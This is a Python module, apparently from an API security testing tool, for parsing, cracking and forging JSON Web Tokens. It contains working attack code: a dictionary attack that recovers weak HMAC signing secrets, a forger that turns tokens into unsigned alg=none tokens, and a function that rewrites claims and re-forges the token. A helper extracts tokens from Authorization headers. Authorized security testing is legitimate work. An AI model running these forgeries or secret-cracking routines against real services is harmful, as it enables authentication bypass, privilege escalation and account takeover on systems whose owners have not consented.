"""JWT parsing, cracking, and forging — from apisec.py."""
import base64
import hashlib
import hmac
import json

from ..config import JWT_WEAK_SECRETS


def _b64url_decode(s):
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s.encode())


def _b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=")


def jwt_parts(token):
    """Return (header_dict, payload_dict, signing_input, sig_bytes) or None."""
    segs = token.split(".")
    if len(segs) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(segs[0]))
        payload = json.loads(_b64url_decode(segs[1]))
        sig = _b64url_decode(segs[2] + "==") if segs[2] else b""
    except Exception:
        return None
    signing_input = (segs[0] + "." + segs[1]).encode()
    return header, payload, signing_input, sig


def jwt_crack_weak_secret(token):
    """Offline HMAC dictionary attack. Returns the secret string or None."""
    parsed = jwt_parts(token)
    if not parsed:
        return None
    header, _, signing_input, sig = parsed
    alg = header.get("alg", "").upper()
    hashfn = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }.get(alg)
    if not hashfn:
        return None
    for candidate in JWT_WEAK_SECRETS:
        mac = hmac.new(candidate.encode(), signing_input, hashfn).digest()
        if hmac.compare_digest(mac, sig):
            return candidate
    return None


def jwt_forge_alg_none(token):
    """Build an alg=none forged token with unmodified payload."""
    parsed = jwt_parts(token)
    if not parsed:
        return None
    header, payload, _, _ = parsed
    header = dict(header)
    header["alg"] = "none"
    h = _b64url_encode(json.dumps(header))
    p = _b64url_encode(json.dumps(payload))
    return (h + b"." + p + b".").decode()


def jwt_tamper_claims(token, claim_overrides):
    """Modify claims and re-sign with alg=none. Returns forged token or None."""
    parsed = jwt_parts(token)
    if not parsed:
        return None
    header, payload, _, _ = parsed
    header = dict(header)
    header["alg"] = "none"
    payload = dict(payload)
    payload.update(claim_overrides)
    h = _b64url_encode(json.dumps(header))
    p = _b64url_encode(json.dumps(payload))
    return (h + b"." + p + b".").decode()


def extract_jwt_from_auth(auth_header):
    """Extract JWT token from an Authorization header value."""
    if not auth_header:
        return None
    parts = auth_header.strip().split()
    if len(parts) == 2 and parts[0].lower() == "bearer":
        token = parts[1]
    elif auth_header.count(".") == 2:
        token = auth_header.strip()
    else:
        return None
    if jwt_parts(token):
        return token
    return None
